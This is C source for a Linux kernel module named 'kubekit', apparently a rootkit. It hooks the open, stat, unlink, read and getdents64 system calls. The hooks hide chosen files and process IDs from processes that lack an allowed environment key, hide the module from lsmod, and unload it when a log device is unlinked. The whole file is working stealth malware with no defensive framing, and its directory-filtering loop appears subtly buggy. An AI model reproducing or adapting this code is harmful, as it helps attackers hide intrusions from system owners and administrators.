#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <asm/syscall.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <uapi/linux/fcntl.h>

#include "helpers.h"
#include "kubekit.h"

#define BASIC_SYSHOOK(sysidx, _reg, path_mode) {    \
    sys_call_ptr_t orig;                            \
    char *full_path;                                \
                                                    \
    orig = hook_get_orig(sysidx);                   \
    if (orig == NULL) {                             \
        return -ENOENT;                             \
    }                                               \
                                                    \
    if (task_env_allowed(current) == true) {        \
        return orig(regs);                          \
    }                                               \
                                                    \
    full_path = full_path_to_file_user(             \
        current,                                    \
        (char *)regs->_reg,                         \
        path_mode                                   \
    );                                              \
    if (full_path == NULL) {                        \
        return orig(regs);                          \
    }                                               \
                                                    \
    if (strncmp(full_path, "/proc/", 6) == 0) {     \
        update_hide_pids();                         \
    }                                               \
                                                    \
    if (should_hide_file(full_path) == true) {      \
        kfree(full_path);                           \
        return -ENOENT;                             \
    }                                               \
                                                    \
    kfree(full_path);                               \
    return orig(regs);                              \
}

asmlinkage long open_hook(struct pt_regs *regs) {
    BASIC_SYSHOOK(__NR_open, di, LOOKUP_FOLLOW);
}

asmlinkage long openat_hook(struct pt_regs *regs) {
    BASIC_SYSHOOK(__NR_openat, si, LOOKUP_FOLLOW);
}

asmlinkage long stat_hook(struct pt_regs *regs) {
    // fix: should we use LOOKUP_FOLLOW here?
    BASIC_SYSHOOK(__NR_stat, di, LOOKUP_FOLLOW);
}

asmlinkage long statx_hook(struct pt_regs *regs) {
    BASIC_SYSHOOK(
        __NR_statx,
        si,
        regs->dx & AT_SYMLINK_NOFOLLOW ? 0 : LOOKUP_FOLLOW
    );
}

asmlinkage long unlink_hook(struct pt_regs *regs) {
    sys_call_ptr_t orig;
    char *full_path;

    orig = hook_get_orig(__NR_unlink);
    if (orig == NULL) {
        return -1;
    }

    full_path = full_path_to_file_user(current, (char *)regs->di, 0);
    if (full_path == NULL) {
        return orig(regs);
    }

    if (task_env_allowed(current) == true) {
        if (strcmp(full_path, "/dev/" LOG_DEVICE_NAME) == 0) {
            kill_self();
            return 0;
        }

        return orig(regs);
    }

    if (strncmp(full_path, "/proc/", 6) == 0) {
        update_hide_pids();
    }

    if (should_hide_file(full_path) == true) {
        kfree(full_path);
        return -ENOENT;
    }

    kfree(full_path);
    return orig(regs);
}

asmlinkage long unlinkat_hook(struct pt_regs *regs) {
    sys_call_ptr_t orig;
    char *full_path;

    orig = hook_get_orig(__NR_unlinkat);
    if (orig == NULL) {
        return -1;
    }

    full_path = full_path_to_file_user(current, (char *)regs->si, 0);
    if (full_path == NULL) {
        return orig(regs);
    }

    if (task_env_allowed(current) == true) {
        if (strcmp(full_path, "/dev/" LOG_DEVICE_NAME) == 0) {
            kill_self();
            return 0;
        }

        return orig(regs);
    }

    if (strncmp(full_path, "/proc/", 6) == 0) {
        update_hide_pids();
    }

    if (should_hide_file(full_path) == true) {
        kfree(full_path);
        return -ENOENT;
    }

    kfree(full_path);
    return orig(regs);
}

// this hook is used to show the module in the
// output of `lsmod` if kubekit env key is set
asmlinkage long read_hook(struct pt_regs *regs) {
    sys_call_ptr_t orig;
    char *file;
    int ret;

    orig = hook_get_orig(__NR_read);
    if (orig == NULL) {
        return 0;
    }

    file = file_from_fd(regs->di);
    if (file == NULL) {
        return orig(regs);
    }

    if (strcmp(file, "/proc/modules") == 0 &&
        task_env_allowed(current) == true) {

        show_self();
        ret = orig(regs);
        hide_self();

        return ret;
    }

    return orig(regs);
}

asmlinkage long getdents64_hook(struct pt_regs *regs) {
    sys_call_ptr_t orig;
    long ret;
    int i;
    char *dir_path, *file_full_path;
    struct linux_dirent64 *user_dirent;
    struct linux_dirent64 *dirent, *curr;

    orig = hook_get_orig(__NR_getdents64);
    if (orig == NULL) {
        // shouldn't happen but just in case
        return 0;
    }

    if (task_env_allowed(current) == true) {
        return orig(regs);
    }

    user_dirent = (struct linux_dirent64 *)regs->si;
    dir_path = file_from_fd(regs->di);
    if (dir_path == NULL) {
        return orig(regs);
    }

    ret = orig(regs);
    if (ret <= 0) {
        kfree(dir_path);
        return ret;
    }

    dirent = kmalloc(ret, GFP_KERNEL);
    if (dirent == NULL) {
        kfree(dir_path);
        return ret;
    }

    if (copy_from_user(dirent, user_dirent, ret) != 0) {
        kfree(dir_path);
        kfree(dirent);
        return ret;
    }

    if (strncmp(dir_path, "/proc", 5) == 0) {
        update_hide_pids();
    }

    i = 0;
    while (i < ret) {
        curr = (struct linux_dirent64 *)((u64)dirent + i);

        file_full_path = format_str("%s/%s", dir_path, curr->d_name);
        if (file_full_path == NULL) {
            continue;
        }

        if (should_hide_file(file_full_path) == true) {
            ret -= curr->d_reclen;
            memmove(
                curr,
                (u8 *)((u64)curr + curr->d_reclen),
                ret - i
            );
            i -= curr->d_reclen;
        }

        i += curr->d_reclen;
        kfree(file_full_path);
    }

    if (copy_to_user(user_dirent, dirent, ret) != 0) {
        ;
    }

    kfree(dirent);
    kfree(dir_path);
    return ret;
}
